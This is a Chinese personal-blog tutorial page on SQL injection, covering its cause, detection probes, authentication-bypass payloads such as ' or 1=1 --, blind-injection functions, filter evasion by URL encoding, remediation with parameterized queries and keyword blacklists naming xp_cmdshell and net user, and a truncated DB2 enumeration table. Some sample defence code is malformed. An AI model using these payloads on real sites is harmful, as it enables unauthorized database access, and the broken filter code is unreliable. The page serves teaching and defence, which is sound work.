<!DOCTYPE html>
<html lang="en">

<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
	
	<!-- title -->
	
	<title>
	
		SQL注入 | 
	 
	竹竿小站
	</title>
	
	<!-- keywords,description -->
	 

	<!-- favicon -->
	
	<link rel="shortcut icon" href="/favicon.jpg">
	


	<!-- search -->
	<script>
		var searchEngine = "https://www.baidu.com/s?wd=";
		if(typeof searchEngine == "undefined" || searchEngine == null || searchEngine == ""){
			searchEngine = "https://www.google.com/search?q=";
		}
		var homeHost = "bamboo.github.io";
		if(typeof homeHost == "undefined" || homeHost == null || homeHost == ""){
			homeHost = window.location.host;
		}
	</script>


	
<link rel="stylesheet" href="/css/main.css">

	
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">

	
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/styles/darcula.min.css">

	
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">


	
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>

	
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

	
<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/highlight.min.js"></script>

	
<script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script>

	
<script src="/js/main.js"></script>

	
		
<script src="https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min.js"></script>

		
<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>

	
	
		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
	<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?3efe99c287df5a1d6f0d02d187e403c1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

<header id="header">
    <a id="title" href="/" class="logo">竹竿小站</a>

	<ul id="menu">
		<li class="menu-item">
			<a href="/about" class="menu-item-link">ABOUT</a>
		</li>
	
		<li class="menu-item">
			<a href="/tags" class="menu-item-link">标签</a>
		</li>
	

	
		<li class="menu-item">
			<a href="/categories" class="menu-item-link">分类</a>
		</li>
	

		<li class="menu-item">
			<a href="https://github.com/wujun234/uid-generator-spring-boot-starter" class="menu-item-link" target="_blank">
				UidGenerator
			</a>
		</li>
		<li class="menu-item">
			<a href="https://github.com/wujun234" class="menu-item-link" target="_blank">
				<i class="fa fa-github fa-2x"></i>
			</a>
		</li>
	</ul>
</header>

	
<div id="sidebar">
	<button id="sidebar-toggle" class="toggle" ><i class="fa fa-arrow-right " aria-hidden="true"></i></button>
	
	<div id="site-toc">
		<input id="search-input" class="search-input" type="search" placeholder="按回车全站搜索">
		<div id="tree">
			

			
							<ul>
								<li class="directory">
									<a href="#" class="directory">
										<i class="fa fa-plus-square-o"></i>
										Linux
									</a>
									
							<ul>
								<li class="file">
									<a href="/2017/08/08/Linux/01linux-%E5%AE%89%E8%A3%85/">
										01linux-安装
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/08/Linux/02Linux%E5%AD%A6%E5%89%8D%E9%A1%BB%E7%9F%A5/">
										02Linux学前须知
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/08/Linux/03Linuxz%E4%B9%8B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/">
										03Linuxz之常用的命令
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2021/04/12/Linux/04Linux%E4%B9%8BVim/">
										04Linux之Vim
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/14/Linux/05Linux%E4%B9%8B%E8%BD%AF%E4%BB%B6%E5%8C%85/">
										05Linux之软件包
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/18/Linux/06Linux%E4%B9%8B%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/">
										06Linux之用户管理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/19/Linux/07Linux%E4%B9%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/">
										07Linux之权限管理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/20/Linux/08Linux%E4%B9%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/">
										08Linux之文件系统管理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/23/Linux/09Linux%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">
										09Linux之高级文件管理系统
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/24/Linux/10Linux%E4%B9%8Bshell/">
										10Linux之shell
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/11/26/Linux/11Linux%E4%B9%8Bshell%E9%AB%98%E7%BA%A7/">
										11Linux之shell高级
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/02/Linux/12Linux%E4%B9%8B%E5%90%AF%E5%8A%A8%E5%BC%95%E5%AF%BC%E4%B8%8E%E4%BF%AE%E5%A4%8D/">
										12Linux之启动引导与修复
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/06/Linux/13Linux%E4%B9%8B%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/">
										13Linux之服务管理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/10/Linux/14Linux%E4%B9%8B%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86/">
										14Linux之系统管理
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/06/Linux/15Linux%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97/">
										15Linux之系统日志
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/17/Linux/16Centos6%E5%92%8CCentos7%E5%9F%BA%E6%9C%AC%E5%AF%B9%E6%AF%94/">
										16Centos6和Centos7基本对比
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/17/Linux/17Linux%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
										17Linux之网络基础
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/10/15/Linux/18Linux%E4%B9%8B%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80SSH/">
										18Linux之服务基础SSH
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/18/Linux/19Linux%E4%B9%8B%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80TCP%20Wrappers/">
										19Linux之服务基础TCP Wrappers
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/18/Linux/20%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E4%B9%8BDHCP/">
										20网络服务之DHCP
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/20/Linux/21%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E4%B9%8BDNS/">
										21网络服务之DNS
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/12/26/Linux/22%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B9%8BVSFTP/">
										22网络服务器之VSFTP
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/10/11/Linux/Bash%E5%BF%AB%E6%8D%B7%E9%94%AE/">
										Bash快捷键
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/10/10/Linux/LInux-CDN%E7%AE%80%E4%BB%8B/">
										LInux-CDN简介
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/10/08/Linux/Llinux-DNS-%E8%AF%A6%E8%A7%A3/">
										Llinux-DNS-详解
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/10/13/Linux/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
										linux常用命令
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2021/04/12/Linux/%E5%8D%8A%E8%99%9A%E6%8B%9F%E5%8C%96%E5%92%8C%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E4%B8%BB%E8%A6%81%E5%8C%BA%E5%88%AB/">
										半虚拟化和硬件虚拟化的主要区别
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
								</li>
								
							</ul>
			
							<ul>
								<li class="directory">
									<a href="#" class="directory">
										<i class="fa fa-plus-square-o"></i>
										web渗透
									</a>
									
							<ul>
								<li class="file active">
									<a href="/2021/04/12/web%E6%B8%97%E9%80%8F/01SQL%E6%B3%A8%E5%85%A5/">
										01SQL注入
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
								</li>
								
							</ul>
			
							<ul>
								<li class="directory">
									<a href="#" class="directory">
										<i class="fa fa-plus-square-o"></i>
										搭建
									</a>
									
							<ul>
								<li class="file">
									<a href="/2018/11/18/%E6%90%AD%E5%BB%BA/NextCloud/">
										NextCloud
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2018/11/18/%E6%90%AD%E5%BB%BA/Nmap-Sublist3r-Hydra%E5%AE%89%E8%A3%85%EF%BC%88Ubuntu%E7%8E%AF%E5%A2%83%EF%BC%89/">
										Nmap-Sublist3r-Hydra安装（Ubuntu环境）
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/04/11/%E6%90%AD%E5%BB%BA/hadoop%E5%8D%95%E6%9C%BA%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/">
										hadoop单机集群搭建
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
								</li>
								
							</ul>
			
							<ul>
								<li class="directory">
									<a href="#" class="directory">
										<i class="fa fa-plus-square-o"></i>
										汇编
									</a>
									
							<ul>
								<li class="file">
									<a href="/2018/12/20/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%961/">
										汇编1
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2018/12/26/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%962/">
										汇编2
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/01/01/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%963/">
										汇编3
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/01/05/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%964/">
										汇编4
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/01/06/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%965/">
										汇编5
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2019/01/07/%E6%B1%87%E7%BC%96/%E6%B1%87%E7%BC%966/">
										汇编6
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
							<ul>
								<li class="file">
									<a href="/2021/04/12/%E6%B1%87%E7%BC%96/%E9%80%9A%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8/">
										通用寄存器
									</a>
								</li>
								<div class="article-toc" style="display: none;"></div>
							</ul>
			
								</li>
								
							</ul>
			
		</div>
	</div>
</div>

	<!-- 引入正文 -->
	<div id="content">
		<h1 id="article-title">

	01SQL注入
</h1>
<div class="article-meta">
	
	<span>BamB00</span>
	<span>2021-04-12 00:04:28</span>
		<div id="article-categories">
    
		<span>Categories：</span>
            
    

    
		<span>Tags：</span>
            
                
                    <span>
                        <i class="fa fa-tag" aria-hidden="true">
                        <a href="/tags/web渗透/">web渗透</a>
                        </i>
                    </span>
                
            
                
                    <span>
                        <i class="fa fa-tag" aria-hidden="true">
                        <a href="/tags/SQL注入/">SQL注入</a>
                        </i>
                    </span>
                
            
    
		</div>

</div>

<div id="article-content">
	<h1 id="0x01-什么是SQL注入"><a href="#0x01-什么是SQL注入" class="headerlink" title="0x01 什么是SQL注入"></a>0x01 什么是SQL注入</h1><p>所谓SQL注入，就是通过把SQL命令插入到WEB表单中提交或者输入到域名参数中传递到后台查询字符串，最终达到欺骗服务器执行的恶意的SQL命令。具体来说，它是利用现有WEB应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过Web表单中输入(恶意)SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照原先的意图去执行SQL语句。</p>
<p>例如  </p>
<pre><code class="PHP">&lt;?php
# 普通的SQL查询语句
id=$GET_[&#39;ID&#39;];
sql=&quot;select name from students where id=&quot;$id&quot;&quot;;
</code></pre>
<blockquote>
<p>普通查询ID就是一个数值，传递过来查询students表下id=$id的name<br>恶意SQL就是<br>传递的ID=1 “ union select database() “</p>
</blockquote>
<p>然后SQL查询语句就会变为了</p>
<pre><code class="SQL">sql=&quot;select name from students where id= &quot;1&quot; union select database()&quot;
</code></pre>
<p>就变成了一个联合查询。<br>查询数据ID=1且查询数据库的名称。这个过程就是SQL注入</p>
<h2 id="0x011-造成SQL注入漏洞的根本原因"><a href="#0x011-造成SQL注入漏洞的根本原因" class="headerlink" title="0x011 造成SQL注入漏洞的根本原因:"></a>0x011 造成SQL注入漏洞的根本原因:</h2><p>简单来说: <strong>过于信任用户输入的数据，没有对任何输入的数据进行过滤。（未任何过滤输入数据）</strong></p>
<p>专业点就是: <strong>参数和命令发生混淆</strong></p>
<h1 id="0x02-检测条件"><a href="#0x02-检测条件" class="headerlink" title="0x02 检测条件"></a>0x02 检测条件</h1><ol>
<li>被检测的网站具有数据交互的模块</li>
<li>涉及到参数提交</li>
</ol>
<p>例如： <code>http://www.exmaple.com/page.xxx</code><br>传递的方式为<br><code>http://www.exmaple.com/page.xxx?name=value</code></p>
<h1 id="0x03-检测方法"><a href="#0x03-检测方法" class="headerlink" title="0x03 检测方法"></a>0x03 检测方法</h1><ol>
<li>数值型<pre><code>http://host/test.php?id=100 and 1=1        //返回成功
http://host/test.php?id=100 and 1=2        //返回失败
</code></pre>
</li>
<li>字符型<pre><code>http://host/test.php?name=rainman ‘ and ‘1’=‘1        //返回成功 
http://host/test.php?name=rainman ‘ and ‘1’=‘2        //返回失败
http://host/test.php?name=rainman ‘ and ‘1’=‘2 ))     //使用括号进行语句闭合
</code></pre>
</li>
<li>搜索型。搜索型注入：简单的判断搜索型注入漏洞存在不存在的办法是：<br>```</li>
</ol>
<p>1)先搜索(‘)，如果出错，说明90%存在这个漏洞。<br>2)然后搜索(%)，如果正常返回，说明95%有洞了。<br>3)然后再搜索一个关键字，比如(2006)吧，正常返回所有2006相关的信息。<br>4)再搜索(2006%’and 1=1 and ‘%’=’)和(2006%’and 1=2 and ‘%’=’)。</p>
<pre><code>4. 绕过验证(常见的为管理登陆)也称万能密码
</code></pre>
<p>用户名输入： ‘or 1=1 or’  密码：任意<br>Admin’ – (或’or 1=1 or’ –)(admin or 1=1 –) (MSSQL)(直接输入用户名，不进行密码验证)<br>用户名输入：admin   密码输入：’ or ‘1’=‘1  也可以<br>用户名输入：admin’ or ‘a’=’a    密码输入：任意<br>用户名输入：’ or 1=1 –<br>用户名输入：admin’ or 1=1 –  密码输入：任意<br>用户名输入：1’or’1’=’1’or’1’=’1   密码输入：任意</p>
<pre><code>5. 不同的SQL服务器连结字符串的语法不同，比如MS SQL Server使用符号+来连结字符串，而Oracle使用符号||来连结：
</code></pre>
<p><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=Book%E2%80%99">http://host/test.jsp?ProdName=Book’</a>       //返回错误<br><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=B%E2%80%99+%E2%80%99ook">http://host/test.jsp?ProdName=B’+’ook</a>     //返回正常<br><a target="_blank" rel="noopener" href="http://host/test.jsp?ProdName=B%E2%80%99%7C%7C%E2%80%99ook">http://host/test.jsp?ProdName=B’||’ook</a>    //返回正常说明有SQL注入<br>如果应用程序已经过滤了’和+等特殊字符，我们仍然可以在输入时过把字符转换成URL编码(即字符ASCII码的16进制)来绕过检查。</p>
<pre><code>注释：大多数数据库系统使用“/*”做为注释，Oracle使用“\-\-”做为注释。

# 0x04 数据库的特征

用于快速的观察数据库是什么类型

1. 观察应用返回的错误信息判断数据库类型。
2. 字符串拼接特点


```SQL
Mysql：’test’ ‘ing’
SQLServer：’test’ + ‘ing’
Oracle：’test’ || ‘ing’
PostgreSQL：’test’ || ‘ing’
</code></pre>
<h1 id="0x05-漏洞技术的利用"><a href="#0x05-漏洞技术的利用" class="headerlink" title="0x05 漏洞技术的利用"></a>0x05 漏洞技术的利用</h1><ol>
<li>联合查询SQL注入技术：UNION联合多个SQL语句。</li>
<li>SQL中逻辑判断使用技术：应用在盲注中，例如判断用户名第一个字符是不是“a”。</li>
<li>基于错误的注入技术：在SQL注入语句中加入执行函数语句。</li>
<li>外连攻击技术：在SQL注入语句中加入外连其他服务器的执行函数，使得连接到其他服务器。</li>
<li>延时攻击：注入语句中加入睡眠时间，以此根据响应时间判断猜测正确与否。</li>
<li>注释块<code>（’/* sql */’）</code>包含一个感叹号标记时<code>（‘/*! sql */’）</code>，MySQL可以对其进行解析，而其他数据库系统将其作为普通注释块。</li>
</ol>
<p>更详细的利用<br><a target="_blank" rel="noopener" href="https://skills.bugbank.cn/skill.html?type=3">漏洞银行技能树</a></p>
<h1 id="0x06-盲注"><a href="#0x06-盲注" class="headerlink" title="0x06 盲注"></a>0x06 盲注</h1><pre><code>字符串长度：length(str)
基于时间的盲注：sleep()
不用引号实现字符串：CHR(104) || CHR(101) || CHR(108) || CHR(108)    //返回字符串的ASCII码值
和以上相反：ASCII(‘r’) || ASCII(’o’) || ASCII(‘t’)
</code></pre>
<p>非关系型数据库（NoSQL）：NoSQL注入攻击可以在过程语言中执行，而不是在声明式的SQL语言，所以潜在的影响要大于传统的SQL注入。</p>
<h1 id="0x07-修复方案"><a href="#0x07-修复方案" class="headerlink" title="0x07 修复方案"></a>0x07 修复方案</h1><p>借 星盟大佬的一句话，任何对数据库的操作的语句都是不可信任的。</p>
<p>推荐使用参数化查询方式进行SQL查询，可以有效防御SQL注入问题</p>
<p>建议在代码中对数字类型的参数先进行数字类型变换，然后再代入到SQL查询语句中，这样任何注入行为都不能成功。并且考虑过滤一些参数，比如get参数和post参数中对于SQL语言查询的部分。</p>
<p>所以防范的时候需要对用户的输入进行检查。特别式一些特殊字符，比如单引号，双引号，分号，逗号，冒号，连接号等进行转换或者过滤。</p>
<pre><code>net user
xp_cmdshell
add
exec master.dbo.xp_cmdshell
net localgroup administrators
select
count
Asc
char
mid
&#39;
：
&quot;
insert
delete from
drop table
update
truncate
from
%
</code></pre>
<h2 id="0x071-如果网站使用的语言为asp或者aspx，则可通过如下几种方式进行修复："><a href="#0x071-如果网站使用的语言为asp或者aspx，则可通过如下几种方式进行修复：" class="headerlink" title="0x071 如果网站使用的语言为asp或者aspx，则可通过如下几种方式进行修复："></a>0x071 如果网站使用的语言为asp或者aspx，则可通过如下几种方式进行修复：</h2><pre><code>1. Replace过滤字符：解决方法:查找login.asp下的
   ```java
    username=request.Form(&quot;name&quot;)
    pass=request.Form(&quot;pass&quot;)

    修改为：
    username=Replace(request.Form(&quot;name&quot;), &quot;&#39;&quot;, &quot;&#39;&#39;&quot;)
    pass=Replace(request.Form(&quot;pass&quot;), &quot;&#39;&quot;, &quot;&#39;&#39;&quot;)
    语法是屏蔽&#39;和&#39;&#39;字符来达到效果。
    ```
2. conn.asp 内加入：(前提：登陆页面有)
    ```java
    &lt;%
        Dim Query_Badword,Form_Badword,i,Err_Message,Err_Web,name
        Err_Message = 3
        Err_Web = &quot;safe.htm&quot;
        //出错时转向的页面

        Query_Badword=&quot;‘|and|select|update|chr|delete|%20from|;|insert|mid|master.|set|chr(37)|=&quot;
        //在这部份定义get非法参数,使用&quot;|&quot;号间隔
        Form_Badword=&quot;‘|(|)|;|=&quot;
        //在这部份定义post非法参数,使用&quot;|&quot;号间隔
        On Error Resume Next
        if request.QueryString&lt;&gt;&quot;&quot; then
            Chk_badword=split(Query_Badword,&quot;|&quot;)
            FOR EACH Query_Name IN Request.QueryString
                for i=0 to ubound(Chk_badword)
                    If Instr(LCase(request.QueryString(Query_Name)),Chk_badword(i))&lt;&gt;0 Then
                        Select Case Err_Message
                            Case &quot;1&quot;
                            Response.Write &quot; 
                            Case &quot;2&quot;
                            Response.Write &quot; 
                            Case &quot;3&quot;
                            Response.Write &quot; 
                        End Select
                        Response.End
                    End If
                NEXT
            NEXT
        End if

        if request.form&lt;&gt;&quot;&quot; then
            Chk_badword=split(Form_Badword,&quot;|&quot;)
            FOR EACH name IN Request.Form
                for i=0 to ubound(Chk_badword)
                    If Instr(LCase(request.form(name)),Chk_badword(i))&lt;&gt;0 Then
                        Select Case Err_Message
                            Case &quot;1&quot;
                            Response.Write &quot; 
                            Case &quot;2&quot;
                            Response.Write &quot; 
                            Case &quot;3&quot;
                            Response.Write &quot; 
                        End Select
                        Response.End
                    End If
                NEXT
            NEXT
        end if
    %&gt;
    ```
3. ASP一般编程上可参考以下代码编程思路，过滤GET/POST请求模块代码：
    ```java
    dim SQL_injdata 
    SQL_injdata = &quot;&#39;|and|exec|insert|select|delete|update|count|*|% |chr|mid|master|truncate|char|declare&quot; 
    SQL_inj = split(SQL_Injdata,&quot;|&quot;) 
    If Request.QueryString&lt;&gt;&quot;&quot; Then 
        For Each SQL_Get In Request.QueryString 
            For SQL_Data=0 To Ubound(SQL_inj) 
                if instr(Request.QueryString(SQL_Get),SQL_Inj(SQL_DATA))&gt;0 Then 
                    Response.Write &quot;参数中包含非法字符&quot; 
                    Response.end 
                end if 
            next 
        Next
    end if
    ```
</code></pre>
<h2 id="0x072-对于PHP语言编写的网站，大都是和mysql数据库结合的，可通过如下几种方法结合起来防范SQL注入的漏洞："><a href="#0x072-对于PHP语言编写的网站，大都是和mysql数据库结合的，可通过如下几种方法结合起来防范SQL注入的漏洞：" class="headerlink" title="0x072 对于PHP语言编写的网站，大都是和mysql数据库结合的，可通过如下几种方法结合起来防范SQL注入的漏洞："></a>0x072 对于PHP语言编写的网站，大都是和mysql数据库结合的，可通过如下几种方法结合起来防范SQL注入的漏洞：</h2><ol>
<li><p>修改php中默认配置文件php.ini中的配置，来降低sql注入的风险：</p>
<pre><code class="php">参考路径：/usr/local/apache2/conf/php.ini，不同中间件可能位置不一样

修改如下几项：
safe_mode = on             //开启安全模式
magic_quotes_gpc = On      //开启过滤函数
display_errors = Off       //禁止错误信息提示

注：把magic_quotes_gpc选项打开，在这种情况下所有的客户端GET和POST的数据都会自动进行addslashes处理，
所以此时对字符串值的SQL注入是不可行的，但要防止对数字值的SQL注入，如用intval()等函数进行处理。但如果你
编写的是通用软件，则需要读取服务器的magic_quotes_gpc后进行相应处理

在GET提交的数据中进行过滤select、update、delete、insert等其他语句。使用正则就构建如下函数：

&lt;?php
    function inject_check($sql_str)
    &#123;
        return eregi(&#39;select|insert|update|delete|&#39;|)
        function verify_id($id=null)
        &#123;
            if (!$id) &#123; exit(&#39;没有提交参数！&#39;);
        &#125;                                                           //是否为空判断
        elseif (inject_check($id)) &#123; exit(&#39;提交的参数非法！&#39;); &#125;      //注射判断
        elseif (!is_numeric($id)) &#123; exit(&#39;提交的参数非法！&#39;); &#125;      //数字判断
        $id = intval($id); // 整型化
        return $id;
    &#125;
?&gt;

然后进行对某个参数的过滤：

&lt;?php     
    if (inject_check($_GET[&#39;id&#39;]))     
    &#123;     
        exit(&#39;你提交的数据非法，请检查后重新提交！&#39;);     
    &#125;     
    else     
    &#123;     
        $id = verify_id($_GET[&#39;id&#39;]); // 这里引用了我们的过滤函数，对$id进行过滤     
        echo &#39;提交的数据合法，请继续！&#39;;     
    &#125;     
?&gt;
</code></pre>
</li>
<li><p>在POST提交的数据中，使用函数addslashes()是最终的比较好的方法，构建如下函数：</p>
<pre><code class="PHP">&lt;?php        
function str_check( $str )     
&#123;     
    if (!get_magic_quotes_gpc())              //判断magic_quotes_gpc是否打开     
    &#123;     
        $str = addslashes($str);              //进行过滤     
    &#125;     
    $str = str_replace(&quot;_&quot;, &quot;\_&quot;, $str);      //把 &#39;_&#39;过滤掉     
    $str = str_replace(&quot;%&quot;, &quot;\%&quot;, $str);      //把&#39; % &#39;过滤掉     
    return $str;     
    &#125;     
?&gt;

对于大批量的数据，修改为如下：

&lt;?php      
    function post_check($post)     
    &#123;     
        if (!get_magic_quotes_gpc())                  //判断magic_quotes_gpc是否为打开     
        &#123;     
            $post = addslashes($post);                //进行magic_quotes_gpc没有打开的情况对提交数据的过滤     
        &#125;     
        $post = str_replace(&quot;_&quot;, &quot;\_&quot;, $post);        //把 &#39;_&#39;过滤掉     
        $post = str_replace(&quot;%&quot;, &quot;\%&quot;, $post);        //把&#39; % &#39;过滤掉     
        $post = nl2br($post);                         //回车转换     
        $post= htmlspecialchars($post);               //html标记转换        
        return $post;     
    &#125;     
?&gt;
</code></pre>
</li>
<li><p>对于MySQL用户，可以使用函数mysqli_real_escape_string( )：</p>
<pre><code class="PHP">&lt;?php
$clean = array();
$mysql = array();
$clean[&#39;last_name&#39;] = &quot;O&#39;Reilly&quot;;
$mysql[&#39;last_name&#39;] = mysqli_real_escape_string($clean[&#39;last_name&#39;]);
$sql = &quot;INSERT
    INTO   user (last_name)
        VALUES (&#39;&#123;$mysql[&#39;last_name&#39;]&#125;&#39;)&quot;;
?&gt;
</code></pre>
</li>
<li><p>使用支持参数化查询语句和占位符的数据库操作类(如PEAR::DB, PDO等)，如使用PEAR::DB的例子</p>
<pre><code class="PHP">&lt;?php
$sql = &#39;INSERT
    INTO   user (last_name)
    VALUES (?)&#39;;
$dbh\-&gt;query($sql, array($clean[&#39;last_name&#39;]));
?&gt;
</code></pre>
</li>
</ol>
<pre><code>以上方法结合使用，则可有效的防止在PHP语言网站的SQL注入。
</code></pre>
<h2 id="0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生"><a href="#0x073-除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生" class="headerlink" title="0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:"></a>0x073 除此之外，还可以进行对数据库方面进行加固，来防止sql注入的产生:</h2><p>不要以sysadmin的身份连接数据库。而是使用特定的数据库用户，只具有读取，写入和更新数据库中适当数据的适当特权。此帐户定期检查，确定它所具有的特权。</p>
<p>以安全的方式创建SQL。让数据库来完成创建SQL的工作，而不是在代码中完成。使用参数化SQL语句，同时也能提高查询的效率。</p>
<p>保证数据库用户连接信息非明文保存。</p>
<h1 id="0x08-附各个数据库的注入语句："><a href="#0x08-附各个数据库的注入语句：" class="headerlink" title="0x08 附各个数据库的注入语句："></a>0x08 附各个数据库的注入语句：</h1><p>注：释义中的’-‘代表和上一个一样，因为一个释义可能有几种形式的SQL语句嘛，下同</p>
<h2 id="0x081-DB2数据库"><a href="#0x081-DB2数据库" class="headerlink" title="0x081 DB2数据库"></a>0x081 DB2数据库</h2><table>
<thead>
<tr>
<th>释义</th>
<th>SQL语句</th>
<th>其他</th>
</tr>
</thead>
<tbody><tr>
<td>当前数据库</td>
<td>select current server from sysibm.sysdummy1</td>
<td>-</td>
</tr>
<tr>
<td>所有数据库</td>
<td>SELECT schemaname FROM syscat.schemata</td>
<td>-</td>
</tr>
<tr>
<td>查询表名</td>
<td>select name from sysibm.systables</td>
<td>-</td>
</tr>
<tr>
<td>查询列名</td>
<td>select name, tbname, coltype from sysibm.syscolumns</td>
<td>-</td>
</tr>
<tr>
<td>获取版本</td>
